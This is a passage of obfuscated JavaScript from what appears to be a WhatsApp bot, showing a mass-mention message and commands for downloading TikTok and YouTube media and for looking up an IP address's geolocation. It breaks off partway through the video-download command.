"\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let _0x2fdbdb of _0x349e8b) {
            _0x5c7db7 += "🗿 @" + _0x2fdbdb.id.split("@")[0] + "\n";
          }
          _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            text: _0x5c7db7,
            mentions: _0x349e8b.map(_0x4bd23f => _0x4bd23f.id)
          }, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "ttdown2":
        {
          const _0x2ef57d = require("cheerio");
          let _0x51eabe = "Ex : " + (_0x3a5987 + _0x4ae68c) + " https://vt.tiktok.com/ZSYgBPSLD/";
          async function _0x331574(_0x5d90e9) {
            try {
              const _0xce66a2 = {
                id: _0x5d90e9,
                locale: "id",
                tt: "RFBiZ3Bi"
              };
              const _0x1e3e77 = new URLSearchParams(_0xce66a2);
              const _0x304733 = {
                "HX-Request": true,
                "HX-Trigger": "_gcaptcha_pt",
                "HX-Target": "target",
                "HX-Current-URL": "https://ssstik.io/id",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
                Referer: "https://ssstik.io/id"
              };
              const _0x29e503 = {
                headers: _0x304733
              };
              const _0x2b0f8a = await axios.post("https://ssstik.io/abc?url=dl", _0x1e3e77, _0x29e503);
              const _0x586ce7 = _0x2b0f8a.data;
              const _0x1661ac = _0x2ef57d.load(_0x586ce7);
              const _0x3f8e79 = _0x1661ac("#avatarAndTextUsual h2").text().trim();
              const _0x287815 = _0x1661ac("#avatarAndTextUsual p").text().trim();
              const _0x462d38 = _0x1661ac(".result_overlay_buttons a.download_link").attr("href");
              const _0x4a4918 = _0x1661ac(".result_overlay_buttons a.download_link.music").attr("href");
              const _0x1d95df = [];
              _0x1661ac("img[data-splide-lazy]").each((_0x451821, _0x121b22) => {
                const _0x372f96 = _0x1661ac(_0x121b22).attr("data-splide-lazy");
                _0x1d95df.push(_0x372f96);
              });
              const _0x3c5ae7 = {
                isSlide: _0x462d38 ? false : true,
                author: _0x3f8e79,
                title: _0x287815,
                result: _0x462d38 || _0x1d95df,
                audio: _0x4a4918
              };
              return _0x3c5ae7;
            } catch (_0x343ba0) {
              console.error("Error:", _0x343ba0);
              return null;
            }
          }
          if (!_0x40d288) {
            return _0x3b9923(_0x51eabe);
          }
          if (!_0x40d288.includes("http://") && !_0x40d288.includes("https://")) {
            return _0x3b9923("url invalid, please input a valid url. Try with add http:// or https://");
          }
          if (!_0x40d288.includes("tiktok.com")) {
            return _0x3b9923("Invalid Tiktok URL.");
          }
          try {
            const {
              isSlide: _0x4332a4,
              result: _0x580e5f,
              title: _0x582fb7,
              author: _0x2814ea
            } = await _0x331574(_0x40d288);
            let _0x446ca8 = 1;
            if (_0x4332a4 == true) {
              await _0x3b9923("Terdeteksi url tiktok slide\nFoto dikirim ke chat pribadi");
              let _0x3b8353 = "乂 *TIK TOK SLIDE*\n\n";
              for (let _0x5b92a0 of _0x580e5f) {
                await _0x4b53e5.sendMessage(_0x21f0d9.sender, {
                  image: await _0x48aac2(_0x5b92a0)
                });
              }
            } else if (_0x4332a4 == false) {
              await _0x3b9923("Terdeteksi url tiktok video");
              let _0x27de1d = "*" + _0x582fb7 + "*\n  \n  - Author: " + _0x2814ea;
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
                video: await _0x48aac2(_0x580e5f),
                caption: _0x27de1d
              }, {
                quoted: _0x21f0d9
              });
            }
          } catch (_0x113467) {
            return _0x113467;
          }
        }
        break;
      case "trackip":
        {
          if (!_0x40d288) {
            return _0x3b9923("*Example:* " + (_0x3a5987 + _0x4ae68c) + " 112.90.150.204");
          }
          try {
            let _0x16d983 = await fetch("https://ipwho.is/" + _0x40d288).then(_0x543a55 => _0x543a55.json());
            const _0xab803b = _0x3af7f2 => {
              return "\n*IP Information*\n• IP: " + (_0x3af7f2.ip || "N/A") + "\n• Success: " + (_0x3af7f2.success || "N/A") + "\n• Type: " + (_0x3af7f2.type || "N/A") + "\n• Continent: " + (_0x3af7f2.continent || "N/A") + "\n• Continent Code: " + (_0x3af7f2.continent_code || "N/A") + "\n• Country: " + (_0x3af7f2.country || "N/A") + "\n• Country Code: " + (_0x3af7f2.country_code || "N/A") + "\n• Region: " + (_0x3af7f2.region || "N/A") + "\n• Region Code: " + (_0x3af7f2.region_code || "N/A") + "\n• City: " + (_0x3af7f2.city || "N/A") + "\n• Latitude: " + (_0x3af7f2.latitude || "N/A") + "\n• Longitude: " + (_0x3af7f2.longitude || "N/A") + "\n• Is EU: " + (_0x3af7f2.is_eu ? "Yes" : "No") + "\n• Postal: " + (_0x3af7f2.postal || "N/A") + "\n• Calling Code: " + (_0x3af7f2.calling_code || "N/A") + "\n• Capital: " + (_0x3af7f2.capital || "N/A") + "\n• Borders: " + (_0x3af7f2.borders || "N/A") + "\n• Flag:\n - Image: " + (_0x3af7f2.flag?.img || "N/A") + "\n - Emoji: " + (_0x3af7f2.flag?.emoji || "N/A") + "\n - Emoji Unicode: " + (_0x3af7f2.flag?.emoji_unicode || "N/A") + "\n• Connection:\n - ASN: " + (_0x3af7f2.connection?.asn || "N/A") + "\n - Organization: " + (_0x3af7f2.connection?.org || "N/A") + "\n - ISP: " + (_0x3af7f2.connection?.isp || "N/A") + "\n - Domain: " + (_0x3af7f2.connection?.domain || "N/A") + "\n• Timezone:\n - ID: " + (_0x3af7f2.timezone?.id || "N/A") + "\n - Abbreviation: " + (_0x3af7f2.timezone?.abbr || "N/A") + "\n - Is DST: " + (_0x3af7f2.timezone?.is_dst ? "Yes" : "No") + "\n - Offset: " + (_0x3af7f2.timezone?.offset || "N/A") + "\n - UTC: " + (_0x3af7f2.timezone?.utc || "N/A") + "\n - Current Time: " + (_0x3af7f2.timezone?.current_time || "N/A") + "\n";
            };
            if (!_0x16d983.success) {
              throw new Error("IP " + _0x40d288 + " not found!");
            }
            const _0x31fc08 = {
              degreesLatitude: _0x16d983.latitude,
              degreesLongitude: _0x16d983.longitude
            };
            const _0x4c00b0 = {
              location: _0x31fc08
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x4c00b0, {
              ephemeralExpiration: 604800
            });
            const _0x263cf0 = _0x4bddf1 => new Promise(_0x2b6326 => setTimeout(_0x2b6326, _0x4bddf1));
            await _0x263cf0(2000);
            _0x3b9923(_0xab803b(_0x16d983));
          } catch (_0x3a26cc) {
            _0x3b9923("Error: Unable to retrieve data for IP " + _0x40d288);
          }
        }
        break;
      case "ytmp3":
        {
          const _0x37fa13 = require("ytdl-core");
          const _0x61481f = require("fs");
          const _0x59f7fe = require("path");
          const _0x13a8a9 = require("fluent-ffmpeg");
          const _0x47aebe = (await import("buffer")).Buffer;
          const _0x45c6bf = require("yt-search");
          function _0x320485(_0x3bd945) {
            const _0x5e270d = _0x3bd945.length;
            return _0x5e270d;
          }
          const _0x372038 = 10737418240;
          const _0x27a6dd = 104857600;
          const _0x40b90b = async (_0x51f79c, _0x1cfe6d) => {
            const _0x54ce33 = await _0x37fa13.getInfo(_0x51f79c);
            const _0x5cdb2d = _0x37fa13.chooseFormat(_0x54ce33.formats, {
              quality: "highestaudio",
              filter: "audioonly"
            });
            if (!_0x5cdb2d) {
              throw new Error("Tidak ditemukan format audio");
            }
            const _0x30c61e = _0x59f7fe.join("/tmp", "audio_" + Date.now() + ".mp3");
            const _0x2f990f = _0x59f7fe.join("/tmp", "temp_audio_" + Date.now() + ".mp3");
            await new Promise((_0x2ea674, _0x18adc9) => {
              const _0x1b60dc = {
                format: _0x5cdb2d
              };
              _0x37fa13(_0x51f79c, _0x1b60dc).pipe(_0x61481f.createWriteStream(_0x2f990f)).on("finish", _0x2ea674).on("error", _0x18adc9);
            });
            return new Promise((_0xaec903, _0x39ca9d) => {
              _0x13a8a9(_0x2f990f).audioCodec("libmp3lame").audioBitrate(_0x1cfe6d).save(_0x30c61e).on("end", async () => {
                await _0x61481f.promises.unlink(_0x2f990f);
                const _0x377c66 = await _0x61481f.promises.stat(_0x30c61e);
                if (_0x377c66.size > _0x372038) {
                  throw new Error("Ukuran file melebihi batas 10 GB");
                }
                _0xaec903(_0x30c61e);
              }).on("error", _0x39ca9d);
            });
          };
          const [_0x584657, _0x39b2a0] = _0x40d288.trim().split(" --");
          let _0x3ab6d0 = "[!] *wrong input*\n\nEx: " + (_0x3a5987 + _0x4ae68c) + " https://youtube.com/watch?v=E7yWbUi_SUo --128 \n> Tersedia 3 opsi bitrate 128,192,320 otomatis 320";
          try {
            if (!_0x584657) {
              return _0x3b9923(_0x3ab6d0);
            }
            const _0x4b54a5 = _0x44455d => {
              const _0x58d4d6 = /(?:youtu\.be\/|youtube\.com(?:.*[?&]v=|.*\/))([^?&]+)/.exec(_0x44455d);
              if (_0x58d4d6) {
                return _0x58d4d6[1];
              } else {
                return null;
              }
            };
            const _0x143052 = async _0x7eb56 => {
              let _0xadb2bf = await _0x4b54a5(_0x7eb56);
              const _0x12d7b8 = {
                videoId: _0xadb2bf
              };
              const {
                title: _0x44ae02,
                description: _0x3f2270,
                url: _0x2fd83f,
                videoId: _0x23b504,
                seconds: _0x428881,
                timestamp: _0x11c7b8,
                views: _0x41df9c,
                genre: _0x30fd1e,
                uploadDate: _0x29171c,
                ago: _0x19309c,
                image: _0x1e2f62,
                thumbnail: _0x109d27,
                author: _0x4842b8
              } = await _0x45c6bf(_0x12d7b8);
              const _0x3200ed = {
                title: _0x44ae02,
                description: _0x3f2270,
                url: _0x2fd83f,
                videoId: _0x23b504,
                seconds: _0x428881,
                timestamp: _0x11c7b8,
                views: _0x41df9c,
                genre: _0x30fd1e,
                uploadDate: _0x29171c,
                ago: _0x19309c,
                image: _0x1e2f62,
                thumbnail: _0x109d27,
                author: _0x4842b8
              };
              return _0x3200ed;
            };
            let _0x1a6cb2 = await _0x143052(_0x584657);
            const _0x479a6b = await _0x40b90b(_0x584657, _0x39b2a0 || "320");
            const _0x289db6 = await _0x61481f.promises.stat(_0x479a6b);
            let _0x505112 = "*[ Ytmp3 Downloader ]*\n\n*• Name:* " + _0x1a6cb2.title + "\n*• Author:* " + _0x1a6cb2.author.name + "\n*• Profile Author:* " + _0x1a6cb2.author.url + "\n*• Durasi:* " + _0x1a6cb2.timestamp + "\n*• Views:* " + _0x1a6cb2.views + "\n*• Upload Video:* " + _0x1a6cb2.uploadDate + "\n*• Bitrate:* " + (_0x39b2a0 || "320 kbps") + "\n*• Description:* " + _0x1a6cb2.description;
            let _0x44740f = "*[ Downloader Audio Youtube ]*\n        \n*• Name:* " + _0x1a6cb2.title + "\n*• Author:* " + _0x1a6cb2.author.name + "\n*• Profile Author:* " + _0x1a6cb2.author.url + "\n*• Durasi:* " + _0x1a6cb2.timestamp + "\n*• Views:* " + _0x1a6cb2.views + "\n*• Upload Video:* " + _0x1a6cb2.uploadDate + "\n*• Bitrate:* " + (_0x39b2a0 || "320 kbps") + "\n\n*_Please Wait For Sending Audio....._*";
            if (_0x39b2a0 === "doc" || _0x289db6.size > _0x27a6dd) {
              await _0x4b53e5.sendFile(_0x21f0d9.chat, _0x1a6cb2.image, null, _0x44740f, _0x21f0d9);
              await _0x96020a(3000);
              const _0x298599 = {
                url: _0x479a6b
              };
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
                document: _0x298599,
                mimetype: "audio/mpeg",
                fileName: _0x1a6cb2.title + ".mp3",
                caption: _0x505112
              }, {
                quoted: _0x21f0d9
              });
              await _0x61481f.promises.unlink(_0x479a6b);
            } else {
              await _0x4b53e5.sendFile(_0x21f0d9.chat, _0x1a6cb2.image, null, _0x44740f, _0x21f0d9);
              await _0x96020a(3000);
              const _0x3cf3e7 = {
                url: _0x479a6b
              };
              const _0x10defe = {
                audio: _0x3cf3e7,
                mimetype: "audio/mpeg",
                fileName: _0x1a6cb2.title
              };
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x10defe, {
                quoted: _0x21f0d9
              });
              await _0x61481f.promises.unlink(_0x479a6b);
            }
          } catch (_0x395a1d) {
            console.error("Error downloading audio:", _0x395a1d);
            _0x3b9923("Terjadi kesalahan saat mengunduh audio: " + _0x395a1d.message);
          }
        }
        break;
      case "ytmp4":
        {
          const [_0x2e14fb, _0x58d519] = _0x40d288.trim().split(" ");
          const _0x1d2ba6 = require("ytdl-core");
          const {
            exec: _0x18690f
          } = require("child_process");
          const _0x183739 = require("fs");
          const _0x3dd491 = require("path");
          function _0x452997(_0x1882d4) {
            const _0x4af849 = _0x183739.statSync(_0x1882d4);
            return _0x4af849.size;
          }
          const _0x9cf7a3 = async (_0x12a240, _0x334093) => {
            const _0x5be32a = await _0x1d2ba6.getInfo(_0x12a240);
            let _0x160cd4;
            if (_0x334093) {
              _0x160cd4 = _0x5be32a.formats.find(_0x476534 => _0x476534.height === _0x334093 && _0x476534.container === "mp4");
            }
            if (!_0x160cd4) {
              _0x160cd4 = _0x5be32a.formats.find(_0x42e6a8 => _0x42e6a8.height === 720 && _0x42e6a8.container === "mp4");
            }
            if (!_0x160cd4) {
              _0x160cd4 = _0x5be32a.formats.filter(_0x526ac7 => _0x526ac7.container === "mp4").sort((_0x592b96, _0x1852bd) => _0x1852bd.height - _0x592b96.height)[0];
            }
            const _0x41a0d8 = _0x1d2ba6.chooseFormat(_0x5be32a.formats, {
              quality: "highestaudio",
              filter: "audioonly"
            });
            if (!_0x160cd4) {
              throw new Error("Tidak ditemukan format video yang sesuai.");
            }
            if (!_0x41a0d8) {
              throw new Error("Tidak ditemukan format audio.");
            }
            const _0x2c2a8b = _0x3dd491.join("/tmp", "video_" + Date.now() + ".mp4");
            const _0x3511de = _0x3dd491.join("/tmp", "audio_" + Date.now() + ".mp4");
            const _0x2cf8c6 = _0x3dd491.join("/tmp", "output_" + Date.now() + ".mp4");
            await new Promise((_0x532a4c, _0x142c16) => {
